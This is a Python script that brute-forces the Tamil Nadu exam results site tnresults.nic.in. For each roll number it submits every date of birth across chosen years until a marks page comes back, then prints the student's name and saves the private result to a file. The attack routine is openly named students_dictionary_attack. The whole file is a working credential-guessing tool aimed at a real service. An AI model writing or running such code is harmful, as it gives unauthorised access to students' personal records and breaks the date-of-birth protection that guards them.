from requests import post, exceptions
from bs4 import BeautifulSoup 
from datetime import datetime, timedelta
from time import sleep
from sys import argv

Screen_size = 140


def process_package(package):
    size = str( ( str(len(package.content)/1008)[0:4] + 'kb'))
    status = package.status_code
    content = BeautifulSoup(package.text, 'html.parser').find('div',{'data-role' : 'content'}).text
    
    if 50> len(content):
        return { 'validation': False, 'content': content, 'size': size, 'status': status}
    else:
        return { 'validation': True, 'content': content, 'size': size, 'status': status}

def get_name_from_package(content):

    lines = content.splitlines()
    name = str(lines[6] + ')')
    return name.replace('\xa0\xa0\xa0','')

def remove_unicode(content):
    content = content.replace("\xa0",'').replace("\t",'').replace("\r",'').split("\n\n\n")
    final_output=''
    for line in content:
        final_output += str("\n" + line + "\n")
    return final_output

def result_screen(Details : dict):
    iD = Details['id']
    dob = Details['date_of_brith']
    count_id = Details['countered_of_id']
    count_dates = Details['countered_of_dates']
    status = Details['status']
    size = Details['size']

    if Details['validation']:
        validation = 'valid'
        name = get_name_from_package(Details['content'])
    else:   validation = 'invalid'
    
    print(f'-' *Screen_size)
    print(f'[req] :  {iD} | {dob}  ({count_id}/{count_dates}) @!{status}  ^ ({size}kb)')
    print(f'     ')
    if Details['validation']:	print(f'>>> Name          : ', name)
    print(f'>>> Student       : ', iD)
    print(f'>>> DOB           : ', dob)
    print(f'>>> validation    : ', validation)
    print(f'>>> Total_count   : ', Details['countered_connection'])
    print(f'-' *Screen_size)

def save_result_file(Details : dict):

    content = remove_unicode(Details['content'])
    student = Details['id']
    date = Details['date_of_brith']
    
    name = get_name_from_package(Details['content'])

    with open(f"result[{name}].txt","w") as file:
        file.write("-" *40)
        file.write(f" {student} || {date} ")
        file.write("-" *40)
        file.write(str(content))
        file.close()

def connection_send_package(roll_no : str , date_of_brith : str):
    url = 'https://tnresults.nic.in/wrfexrcd.asp'
    header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, image/avif, image/webp,image/apng,*/*;q=0.8,application/signed-exchange; v=b3;q=0.7' ,
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-IN, en-GB;q=0.9,en-US;q=0.8,en;q=0.7' ,
    'Cache-Control': 'max-age=0' ,
    'Connection': 'keep-alive',
    'Content-Length': '45',
    'Content-Type':'application/x-www-form-urlencoded',
    'Cookie': 'ASPSESSIONIDCQABDARQ-GAAMKBBBEHJNBIKLKOCKENHL' ,
    'Host': 'tnresults.nic.in',
    'Origin': 'https://tnresults.nic.in',
    'Referer': 'https://tnresults.nic.in/wpcsxtd.htm',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36sec-ch-ua: "Not-A. Brand";v="99", "Chromium"; v="124" ' ,
    'sec-ch-ua-mobile':'?1',
    'sec-ch-ua-platform':'"Android" '}
    
    payload = {'regno':roll_no, 'dob': date_of_brith, 'B1':'Get Marks'}

    try:   
        responce = post(url, headers=header, data=payload)
        return responce

    except exceptions:
        sleep(5)
        responce = connection_send_package(roll_no, date_of_brith)
        return responce



def students_dictionary_attack( collaction_of_rollno : list, collaction_of_date_of_brith : list):
    
    countered_of_id = 0
    countered_connection  = 0 
    
    for studentId in collaction_of_rollno:
        countered_of_id += 1
        countered_of_dates = len( collaction_of_date_of_brith)
        
        for date_of_brith in collaction_of_date_of_brith:
            countered_of_dates -= 1
            countered_connection += 1
            
            package = connection_send_package( str(studentId), str(date_of_brith))
            result = process_package(package)
            print(result)
            
            Details = result.copy()
            Details.update({'id': studentId, 'date_of_brith':date_of_brith,'countered_of_id':countered_of_id, 'countered_of_dates':countered_of_dates,'countered_connection': countered_connection})

            result_screen(Details)
            
            if Details['validation']:
                save_result_file(Details)
                break

def open_datasheet(path):
    with open(path,'r') as file:
        data=[]
        lines = file.readlines()
        for line in lines:  data.append(line.replace('\n',''))
        return data
    
def leaf_year(year):

    if year%400 == 0:   leap = True
    elif year%100 == 0: leap = False
    elif year%4 == 0:   leap = True
    else:   leap = False
    return leap
    
def render_day(year):    
    date = datetime.strptime(f"01/01/{year}","%d/%m/%Y")
    data = [f"{year}-01-01"]
    
    if leaf_year(int(year)): #spcieal for leap year guys
            for d in range(365):
                date += timedelta(days=1)
                data.append(str(date)[0:10])
    else:
            for d in range(365):
                date += timedelta(days=1)
                data.append(str(date)[0:10])
    return data


def modify(day):
    ds= day.split("-")
    return str(f"{ds[2]}/{ds[1]}/{ds[0]}")
        
def dob_input_manager(text):
	if '/' in text: return text.split(',')
	else:
	     years = text.split(',')
	     dates, data = [], []
	     
	     if  str(years[0][-4:]) == '.txt':  return open_datasheet(str(years[0]))
	     
	     elif len(years[0]) ==10:
	         for year in years: dates.append(year)
	         return dates
	     else:
	         for year in years:
	                for date in render_day(year):   data.append(date)
	         for day in data:   dates.append(modify(day))
	         return dates

def register_no_input_manager(text):

    info = text.split(",")
    data=[]
    
    if str(info[0][-4:]) == '.txt':
        return open_datasheet(str(info[0]))     
    else:
        for id in info:
            data.append(id)
        return data

def get_input():
    roll_no, date_of_brith = [],[]
    
    if  len(argv) >= 2:
        roll_no = register_no_input_manager(argv[1])
        date_of_brith = dob_input_manager(argv[2])
    
    else:
        roll_no = register_no_input_manager(input("Regno -> "))
        date_of_brith = dob_input_manager(input("Dob  -> "))
        
    return list(roll_no), list(date_of_brith)


reg, dob = get_input()
print(reg, dob)

students_dictionary_attack(reg, dob)
